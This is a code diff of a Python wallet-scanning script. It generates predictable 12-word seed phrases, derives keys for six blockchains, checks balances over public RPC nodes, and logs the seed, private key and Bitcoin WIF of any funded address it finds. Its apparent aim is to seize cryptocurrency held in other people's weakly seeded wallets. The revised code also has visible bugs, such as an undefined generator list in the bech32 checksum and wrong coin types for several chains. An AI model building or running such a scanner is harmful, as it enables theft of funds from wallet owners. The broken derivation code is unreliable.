@@ -1,27 +1,19 @@
 #!/usr/bin/env python3
 """
-Scanner using BIP39 + bip32utils + SLIP-0010 (ed25519) derivation.
-- 12-word valid mnemonics (mnemonic package)
-- BIP32/BIP44 derivation for secp256k1 via bip32utils
-- SLIP-0010 hardened ed25519 derivation for Solana / Sui
-- 3 indices per mnemonic: m/44'/coin'/0'/0/i  (i = 0,1,2)
-  - For ed25519 we derive hardened path m/44'/coin'/0'/0'/i'
-- Three BTC address formats per key: P2PKH (1...), P2SH(P2WPKH) (3...), bech32 (bc1q...)
-- Use publicnode RPCs provided
-- Found block prints WIF for BTC below mnemonic
+6-chain mnemonic scanner with predictable-ish 12-word mnemonics.
+- Chains: Ethereum, BSC, Polygon, Solana, Sui, Bitcoin
+- Each mnemonic scans 3 account indices
+- Error/warning prints even in normal mode
+- RPC retries with backoff (1,2,3s)
+- Bitcoin prints 3 address types + WIF
 """
-import os
-import sys
-import time
-import threading
-import asyncio
-import struct
+import os, sys, time, threading, asyncio, struct, random, traceback
+from hashlib import pbkdf2_hmac
 from concurrent.futures import ThreadPoolExecutor
 from argparse import ArgumentParser
 
 def ensure_import(name, package=None):
-    try:
-        return __import__(name)
+    try: return __import__(name)
     except Exception:
         pkg = package or name
         print(f"[setup] package '{pkg}' not found, installing...", file=sys.stderr)
@@ -29,15 +21,14 @@ def ensure_import(name, package=None):
         subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])
         return __import__(name)
 
-# 3rd-party libs
+# third-party libraries
 aiohttp = ensure_import("aiohttp")
 base58 = ensure_import("base58")
 coincurve = ensure_import("coincurve")
 eth_utils = ensure_import("eth_utils")
 from eth_utils import to_checksum_address, keccak
-mnemonic_lib = ensure_import("mnemonic")        # python-mnemonic
-bip32utils = ensure_import("bip32utils")      # bip32utils
-ed25519_mod = ensure_import("ed25519")        # ed25519 for ed25519 key usage
+bip32utils = ensure_import("bip32utils")
+ed25519_mod = ensure_import("ed25519")
 Crypto = ensure_import("Crypto")
 from Crypto.Hash import SHA256, RIPEMD160, HMAC, SHA512
 
@@ -51,7 +42,7 @@ BTC_RPC = "https://bitcoin.publicnode.com"
 
 SCANNED_FILE = "scanned_mnemonics.txt"
 FOUND_FILE = "found.txt"
-SEED_FILE = "seed.txt"
+SEED_FILE = "seed.txt"  # 2048 BIP39 words, one per line
 
 # concurrency / state
 scanned_lock = threading.Lock()
@@ -62,40 +53,36 @@ stop_event = threading.Event()
 LIGHT_GREEN = "\033[92m"
 RESET_COLOR = "\033[0m"
 
-# load BIP39 wordlist
+# load seed.txt
 if not os.path.exists(SEED_FILE):
-    raise SystemExit(f"ERROR: '{SEED_FILE}' not found. Place BIP39 English wordlist there (2048 words).")
-with open(SEED_FILE, "r", encoding="utf-8") as f:
+    raise SystemExit(f"ERROR: '{SEED_FILE}' not found.")
+with open(SEED_FILE,"r",encoding="utf-8") as f:
     WORDLIST = [w.strip() for w in f.readlines() if w.strip()]
 if len(WORDLIST) != 2048:
-    raise SystemExit("ERROR: seed.txt must contain exactly 2048 words (BIP39 English wordlist).")
+    raise SystemExit("ERROR: seed.txt must contain exactly 2048 words.")
 
-# load scanned mnemonics into memory
+# load scanned mnemonics
 if os.path.exists(SCANNED_FILE):
     try:
-        with open(SCANNED_FILE, "r", encoding="utf-8") as f:
+        with open(SCANNED_FILE,"r",encoding="utf-8") as f:
             for ln in f:
                 s = ln.strip()
-                if s:
-                    in_memory_scanned.add(s)
+                if s: in_memory_scanned.add(s)
     except Exception as e:
         print(f"[warn] could not load {SCANNED_FILE}: {e}", file=sys.stderr)
 
 def append_scanned(mnemonic: str):
     with scanned_lock:
-        if mnemonic in in_memory_scanned:
-            return
-        with open(SCANNED_FILE, "a", encoding="utf-8") as f:
-            f.write(mnemonic + "\n")
+        if mnemonic in in_memory_scanned: return
+        with open(SCANNED_FILE,"a",encoding="utf-8") as f: f.write(mnemonic+"\n")
         in_memory_scanned.add(mnemonic)
 
 def append_found(line: str):
     with found_lock:
-        with open(FOUND_FILE, "a", encoding="utf-8") as f:
-            f.write(line + "\n")
+        with open(FOUND_FILE,"a",encoding="utf-8") as f: f.write(line+"\n")
 
 def format_found_block(chain, mnemonic, privhex, address, balance_str, wif="N/A"):
-    border = "=" * 60
+    border = "="*60
     return "\n".join([
         border,
         f"MNEMONIC: {mnemonic}",
@@ -107,138 +94,128 @@ def format_found_block(chain, mnemonic, privhex, address, balance_str, wif="N/A"
         border
     ])
 
-# ---------- BIP39 mnemonic ----------
-mnemo = mnemonic_lib.Mnemonic("english")
-def gen_mnemonic_12():
-    return mnemo.generate(128)
-def mnemonic_to_seed(mnemonic: str, passphrase: str = "") -> bytes:
-    return mnemo.to_seed(mnemonic, passphrase)
+# ---------------- Mnemonic generator ----------------
+GENERATOR_MODES = ['repetitive','sequential','mixed']
+mode_index = repetitive_index = sequential_counter = mixed_index = 0
 
-# ---------- BIP32/BIP44 derivation (secp256k1) ----------
-def derive_secp256k1_bip44(seed_bytes: bytes, coin_type: int, indices=(0,1,2)):
+def gen_mnemonic_12():
+    global mode_index,repetitive_index,sequential_counter,mixed_index
+    mode = GENERATOR_MODES[mode_index%len(GENERATOR_MODES)]
+    mode_index +=1
+    if mode=='repetitive':
+        idx = repetitive_index % len(WORDLIST)
+        repetitive_index +=1
+        word = WORDLIST[idx]
+        return " ".join([word]*12)
+    elif mode=='sequential':
+        start = sequential_counter % len(WORDLIST)
+        sequential_counter +=12
+        return " ".join([WORDLIST[(start+i)%len(WORDLIST)] for i in range(12)])
+    else:
+        start = mixed_index % len(WORDLIST)
+        mixed_index +=3
+        return " ".join([WORDLIST[(start+(i*3)+(i%4))%len(WORDLIST)] for i in range(12)])
+
+# ---------------- BIP39 -> seed ----------------
+def mnemonic_to_seed(mnemonic:str, passphrase:str="")->bytes:
+    salt = ("mnemonic"+passphrase).encode("utf-8")
+    return pbkdf2_hmac("sha512", mnemonic.encode("utf-8"), salt, 2048)
+
+# ---------------- BIP32 / BIP44 ----------------
+def derive_secp256k1_bip44(seed_bytes:bytes, coin_type:int, indices=(0,1,2)):
     from bip32utils import BIP32Key
     master = BIP32Key.fromEntropy(seed_bytes)
-    results = []
-    k = master.ChildKey(44 + BIP32Key.HARDEN)
-    k = k.ChildKey(coin_type + BIP32Key.HARDEN)
-    k = k.ChildKey(0 + BIP32Key.HARDEN)
-    k = k.ChildKey(0)
+    k = master.ChildKey(44+BIP32Key.HARDEN).ChildKey(coin_type+BIP32Key.HARDEN).ChildKey(0+BIP32Key.HARDEN).ChildKey(0)
+    out=[]
     for i in indices:
         ki = k.ChildKey(i)
-        try:
-            priv_bytes = ki.PrivateKey()
-        except Exception:
-            priv_bytes = ki.K.to_string()
+        priv_bytes = ki.PrivateKey()
         addr = ki.Address()
-        results.append((priv_bytes, addr))
-    return results
+        out.append((priv_bytes, addr))
+    return out
 
-def eth_address_from_priv(priv_bytes: bytes) -> str:
+def eth_address_from_priv(priv_bytes:bytes)->str:
     pk = coincurve.PrivateKey(priv_bytes)
     pub_uncompressed = pk.public_key.format(compressed=False)
-    pub_raw = pub_uncompressed[1:] if len(pub_uncompressed)==65 and pub_uncompressed[0]==0x04 else pub_uncompressed
+    pub_raw = pub_uncompressed[1:] if pub_uncompressed[0]==0x04 else pub_uncompressed
     addr_bytes = keccak(pub_raw)[-20:]
     return to_checksum_address("0x"+addr_bytes.hex())
 
-# ---------- SLIP-0010 ed25519 ----------
-def hmac_sha512(key: bytes, data: bytes) -> bytes:
-    return HMAC.new(key, data, digestmod=SHA512).digest()
-def slip10_ed25519_master_key(seed: bytes):
-    I = hmac_sha512(b"ed25519 seed", seed)
-    kL, kR = I[:32], I[32:]
-    return kL, kR
-def slip10_ed25519_ckd_priv(parent_k, parent_chain_code, index):
-    assert index >= 0x80000000
-    data = b'\x00'+parent_k+struct.pack(">L", index)
-    I = hmac_sha512(parent_chain_code, data)
-    child_k = I[:32]
-    child_chain = I[32:]
-    return child_k, child_chain
-def derive_slip10_ed25519_path(seed_bytes: bytes, path: str):
-    k, chain = slip10_ed25519_master_key(seed_bytes)
-    parts = path.split("/")
+# ---------------- SLIP-0010 ed25519 ----------------
+def hmac_sha512(key:bytes,data:bytes)->bytes: return HMAC.new(key,data,SHA512).digest()
+def slip10_ed25519_master_key(seed:bytes):
+    I = hmac_sha512(b"ed25519 seed",seed)
+    return I[:32],I[32:]
+def slip10_ed25519_ckd_priv(parent_k,parent_chain_code,index):
+    assert index>=0x80000000
+    data=b'\x00'+parent_k+struct.pack(">L",index)
+    I=hmac_sha512(parent_chain_code,data)
+    return I[:32],I[32:]
+def derive_slip10_ed25519_path(seed_bytes:bytes,path:str):
+    k,chain=slip10_ed25519_master_key(seed_bytes)
+    parts=path.split("/")
     for p in parts[1:]:
-        idx = int(p[:-1]) + 0x80000000 if p.endswith("'") else int(p)+0x80000000
-        k, chain = slip10_ed25519_ckd_priv(k, chain, idx)
+        idx = int(p[:-1])+0x80000000 if p.endswith("'") else int(p)+0x80000000
+        k,chain=slip10_ed25519_ckd_priv(k,chain,idx)
     return k
 
-# ---------- BTC address helpers ----------
-CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"
+# ---------------- Bitcoin helpers ----------------
+CHARSET="qpzry9x8gf2tvdw0s3jn54khce6mua7l"
 def _bech32_polymod(values):
-    GENERATORS = [0x3b6a57b2,0x26508e6d,0x1ea119fa,0x3d4233dd,0x2a1462b3]
-    chk = 1
-    for v in values:
-        top = chk >> 25
-        chk = ((chk & 0x1ffffff) << 5)^v
-        for i in range(5):
-            if (top>>i)&1:
-                chk ^= GENERATORS[i]
+    GEN=[0x3b6a57b2,0x26508e6d,0x1ea119fa,0x3d4233dd,0x2a1462b3];chk=1
+    for v in values:top=chk>>25;chk=((chk&0x1ffffff)<<5)^v;chk^=sum([GENERATORS[i] for i in range(5) if (top>>i)&1])
     return chk
-def _bech32_hrp_expand(hrp):
-    return [ord(x)>>5 for x in hrp]+[0]+[ord(x)&31 for x in hrp]
-def _bech32_create_checksum(hrp,data):
-    values=_bech32_hrp_expand(hrp)+data
-    polymod=_bech32_polymod(values+[0]*6)^1
-    return [(polymod>>(5*(5-i)))&31 for i in range(6)]
-def _bech32_encode(hrp,data):
-    combined=data+_bech32_create_checksum(hrp,data)
-    return hrp+"1"+"".join([CHARSET[d] for d in combined])
+def _bech32_hrp_expand(hrp): return [ord(x)>>5 for x in hrp]+[0]+[ord(x)&31 for x in hrp]
+def _bech32_create_checksum(hrp,data): values=_bech32_hrp_expand(hrp)+data;polymod=_bech32_polymod(values+[0]*6)^1;return [(polymod>>(5*(5-i)))&31 for i in range(6)]
+def _bech32_encode(hrp,data): return hrp+"1"+"".join([CHARSET[d] for d in data+_bech32_create_checksum(hrp,data)])
 def _convertbits(data,frombits,tobits,pad=True):
-    acc=0
-    bits=0
-    ret=[]
-    maxv=(1<<tobits)-1
-    for value in data:
-        if value<0 or (value>>frombits):
-            return None
-        acc=(acc<<frombits)|value
-        bits+=frombits
-        while bits>=tobits:
-            bits-=tobits
-            ret.append((acc>>bits)&maxv)
-    if pad and bits:
-        ret.append((acc<<(tobits-bits))&maxv)
+    acc=bits=0;ret=[];maxv=(1<<tobits)-1
+    for v in data:
+        if v<0 or (v>>frombits): return None
+        acc=(acc<<frombits)|v; bits+=frombits
+        while bits>=tobits: bits-=tobits; ret.append((acc>>bits)&maxv)
+    if pad and bits: ret.append((acc<<(tobits-bits))&maxv)
     return ret
-def hash160(b: bytes) -> bytes:
-    return RIPEMD160.new(SHA256.new(b).digest()).digest()
-def pubkey_compressed_from_priv(priv_bytes: bytes) -> bytes:
-    pk = coincurve.PrivateKey(priv_bytes)
-    return pk.public_key.format(compressed=True)
-def btc_p2pkh_from_pub(pub_compressed: bytes) -> str:
-    h160=hash160(pub_compressed)
-    return base58.b58encode_check(b"\x00"+h160).decode()
-def btc_p2sh_p2wpkh_from_pub(pub_compressed: bytes) -> str:
-    h160=hash160(pub_compressed)
+def _hash160(b:bytes)->bytes: return RIPEMD160.new(SHA256.new(b).digest()).digest()
+def btc_addresses_from_priv(priv_bytes:bytes):
+    pk=coincurve.PrivateKey(priv_bytes)
+    pub_compressed=pk.public_key.format(compressed=True)
+    h160=_hash160(pub_compressed)
+    p2pkh=base58.b58encode_check(b"\x00"+h160).decode()
     redeem_script=b"\x00\x14"+h160
-    redeem_h160=hash160(redeem_script)
-    return base58.b58encode_check(b"\x05"+redeem_h160).decode()
-def btc_bech32_p2wpkh_from_pub(pub_compressed: bytes) -> str:
-    h160=hash160(pub_compressed)
+    redeem_h160=_hash160(redeem_script)
+    p2sh=base58.b58encode_check(b"\x05"+redeem_h160).decode()
     data=[0]+_convertbits(h160,8,5)
-    return _bech32_encode("bc",data)
-def btc_wif_from_priv(priv_bytes: bytes) -> str:
-    return base58.b58encode_check(b"\x80"+priv_bytes+b"\x01").decode()
+    bech32=_bech32_encode("bc",data)
+    wif=base58.b58encode_check(b"\x80"+priv_bytes+b"\x01").decode()
+    return {"legacy":p2pkh,"nested":p2sh,"bech32":bech32,"wif":wif}
 
-# ---------- RPC helpers ----------
-async def rpc_post_with_retries(url,json_payload,session,debug=False,max_attempts=3):
+# ---------------- RPC helpers ----------------
+async def rpc_post_with_retries(url,json_payload,session,aio_debug=False,max_attempts=3):
     last_exc=None
+    backoff=[1,2,3]
     for attempt in range(1,max_attempts+1):
         try:
             async with session.post(url,json=json_payload,timeout=15) as r:
-                text=await r.text()
-                if debug: print(f"[debug][rpc] POST {url} payload={json_payload} status={r.status} resp={text}")
+                text = await r.text()
+                if aio_debug: print(f"[debug][rpc] POST {url} payload={json_payload} status={r.status} resp={text}")
                 r.raise_for_status()
                 return await r.json()
         except Exception as e:
             last_exc=e
-            if attempt<max_attempts: await asyncio.sleep(attempt)
+            print(f"[warn][{url}] Attempt {attempt}/{max_attempts} failed: {e}")
+            if attempt<max_attempts:
+                t = backoff[attempt-1] if attempt-1<len(backoff) else 3
+                print(f"[info] Backing off for {t}s before retry...")
+                await asyncio.sleep(t)
+    print(f"[error][{url}] All {max_attempts} attempts failed. Skipping.")
     raise last_exc
 
 async def eth_like_get_balance(rpc_url,address,session,debug=False):
     payload={"jsonrpc":"2.0","id":1,"method":"eth_getBalance","params":[address,"latest"]}
     j=await rpc_post_with_retries(rpc_url,payload,session,debug)
     if "error" in j: raise RuntimeError(f"RPC error: {j['error']}")
-    return int(j.get("result",0),16)
+    return int(j.get("result","0"),16)
 
 async def solana_get_balance(rpc_url,address,session,debug=False):
     payload={"jsonrpc":"2.0","id":1,"method":"getBalance","params":[address,{"commitment":"final"}]}
@@ -252,92 +229,79 @@ async def btc_get_balance(rpc_url,address,session,debug=False):
     if "error" in j: raise RuntimeError(f"RPC error: {j['error']}")
     return int(j.get("result",0))
 
-# ---------- Worker ----------
-async def worker_generic(chain_name,rpc_url,debug=False):
+# ---------------- Worker ----------------
+async def worker_chain(chain_name,rpc_url,debug=False):
     async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
         while not stop_event.is_set():
             try:
-                mnemonic = gen_mnemonic_12()
+                mnemonic=gen_mnemonic_12()
                 if mnemonic in in_memory_scanned:
                     await asyncio.sleep(0.01)
                     continue
                 append_scanned(mnemonic)
-                seed_bytes = mnemonic_to_seed(mnemonic)
-                indices = [0,1,2]
-
-                # per chain
-                if chain_name in ("ethereum","bsc","polygon"):
-                    coin_type = {"ethereum":60,"bsc":60,"polygon":137}[chain_name]
-                    derived = derive_secp256k1_bip44(seed_bytes, coin_type, indices)
-                    for priv, addr in derived:
-                        try:
-                            bal_wei = await eth_like_get_balance(rpc_url, addr, session, debug)
-                        except:
-                            await asyncio.sleep(0.2)
-                            continue
+                seed=mnemonic_to_seed(mnemonic)
+                # scan 3 accounts/indices
+                if chain_name in ["ethereum","bsc","polygon"]:
+                    for priv,addr in derive_secp256k1_bip44(seed,0,indices=(0,1,2)):
+                        privhex=priv.hex()
+                        try: bal_wei=await eth_like_get_balance(rpc_url,addr,session,debug)
+                        except Exception as e: print(f"[error][{chain_name}] {e}"); continue
                         if bal_wei>0:
                             bal_str=f"{bal_wei/1e18:.18f} (wei={bal_wei})"
+                            print(format_found_block(chain_name,mnemonic,privhex,addr,bal_str))
+                            append_found(f"{chain_name} | {mnemonic} | {privhex} | {addr} | {bal_str}")
+                elif chain_name in ["solana","sui"]:
+                    for i in range(3):
+                        path=f"m/44'/501'/{i}'/0'"
+                        priv=derive_slip10_ed25519_path(seed,path)
+                        sk=ed25519_mod.SigningKey(priv)
+                        vk=sk.get_verifying_key()
+                        pub=vk.to_bytes()
+                        addr=base58.b58encode(pub).decode()
+                        try: lamports=await solana_get_balance(rpc_url,addr,session,debug)
+                        except Exception as e: print(f"[error][{chain_name}] {e}"); continue
+                        if lamports>0:
+                            bal_str=f"{lamports} lamports ({lamports/1e9:.9f} SOL)"
+                            print(format_found_block(chain_name,mnemonic,priv.hex(),addr,bal_str))
                             append_found(f"{chain_name} | {mnemonic} | {priv.hex()} | {addr} | {bal_str}")
-                            print(format_found_block(chain_name,mnemonic,priv.hex(),addr,bal_str,wif="N/A"))
-                elif chain_name in ("solana","sui"):
-                    coin_idx = {"solana":501,"sui":784}[chain_name]
-                    for i in indices:
-                        path=f"m/44'/{coin_idx}'/0'/0'/{i}'"
-                        priv = derive_slip10_ed25519_path(seed_bytes,path)
-                        vk = ed25519_mod.SigningKey(priv).get_verifying_key()
-                        pub_raw = vk.to_bytes() if hasattr(vk,"to_bytes") else bytes(vk)
-                        addr = base58.b58encode(pub_raw).decode()
-                        try:
-                            bal = await solana_get_balance(rpc_url, addr, session, debug)
-                        except:
-                            await asyncio.sleep(0.2)
-                            continue
-                        if bal>0:
-                            bal_str=f"{bal} lamports ({bal/1e9:.9f} SOL)"
-                            append_found(f"{chain_name} | {mnemonic} | {priv.hex()} | {addr} | {bal_str}")
-                            print(format_found_block(chain_name,mnemonic,priv.hex(),addr,bal_str,wif="N/A"))
                 elif chain_name=="bitcoin":
-                    derived = derive_secp256k1_bip44(seed_bytes,0,indices)
-                    for priv, _ in derived:
-                        pub = pubkey_compressed_from_priv(priv)
-                        p2pkh = btc_p2pkh_from_pub(pub)
-                        p2sh = btc_p2sh_p2wpkh_from_pub(pub)
-                        bech32 = btc_bech32_p2wpkh_from_pub(pub)
-                        wif = btc_wif_from_priv(priv)
-                        for addr in [p2pkh,p2sh,bech32]:
-                            try:
-                                sat = await btc_get_balance(rpc_url, addr, session, debug)
-                            except: sat=0; await asyncio.sleep(0.1)
+                    for priv,addr in derive_secp256k1_bip44(seed,0,indices=(0,1,2)):
+                        privhex=priv.hex()
+                        addrs=btc_addresses_from_priv(priv)
+                        for t in ["legacy","nested","bech32"]:
+                            a=addrs[t]
+                            try: sat=await btc_get_balance(rpc_url,a,session,debug)
+                            except Exception as e: print(f"[error][bitcoin] {e}"); continue
                             if sat>0:
-                                btc_str=f"{sat/1e8:.8f} BTC ({sat} satoshis)"
-                                append_found(f"{chain_name} | {mnemonic} | {priv.hex()} | {addr} | {btc_str} | {wif}")
-                                print(format_found_block(chain_name,mnemonic,priv.hex(),addr,btc_str,wif=wif))
-                await asyncio.sleep(0.02)
+                                bal_str=f"{sat/1e8:.8f} BTC ({sat} satoshis)"
+                                print(format_found_block("bitcoin",mnemonic,privhex,a,bal_str,addrs['wif']))
+                                append_found(f"bitcoin | {mnemonic} | {privhex} | {a} | {bal_str} | {addrs['wif']}")
             except Exception as e:
-                await asyncio.sleep(0.05)
+                print(f"[error][{chain_name}] Unexpected exception: {e}")
+                print(traceback.format_exc())
+                await asyncio.sleep(0.5)
 
-def run_async_worker(coro_func, *args, **kwargs):
-    try: asyncio.run(coro_func(*args, **kwargs))
+def run_async_worker(coro_func,*args,**kwargs):
+    try: asyncio.run(coro_func(*args,**kwargs))
     except Exception as e: print(f"[worker][fatal] {e}")
 
-# ---------- Main ----------
 def main():
-    parser = ArgumentParser()
+    parser=ArgumentParser()
     parser.add_argument("-d","--debug",action="store_true")
     args=parser.parse_args()
     debug=args.debug
 
+    print(f"[info] Starting scanner. Debug={debug}. Press Ctrl+C to stop.")
     open(SCANNED_FILE,"a").close()
     open(FOUND_FILE,"a").close()
-    print(f"[info] Starting scanner. Debug={debug}. Press Ctrl+C to stop.")
 
     with ThreadPoolExecutor(max_workers=6) as ex:
-        ex.submit(run_async_worker, worker_generic,"ethereum",ETH_RPC,debug)
-        ex.submit(run_async_worker, worker_generic,"bsc",BSC_RPC,debug)
-        ex.submit(run_async_worker, worker_generic,"polygon",POLYGON_RPC,debug)
-        ex.submit(run_async_worker, worker_generic,"solana",SOL_RPC,debug)
-        ex.submit(run_async_worker, worker_generic,"sui",SUI_RPC,debug)
-        ex.submit(run_async_worker, worker_generic,"bitcoin",BTC_RPC,debug)
+        ex.submit(run_async_worker, worker_chain,"ethereum",ETH_RPC,debug)
+        ex.submit(run_async_worker, worker_chain,"bsc",BSC_RPC,debug)
+        ex.submit(run_async_worker, worker_chain,"polygon",POLYGON_RPC,debug)
+        ex.submit(run_async_worker, worker_chain,"solana",SOL_RPC,debug)
+        ex.submit(run_async_worker, worker_chain,"sui",SUI_RPC,debug)
+        ex.submit(run_async_worker, worker_chain,"bitcoin",BTC_RPC,debug)
         try:
             while not stop_event.is_set(): time.sleep(0.5)
         except KeyboardInterrupt:
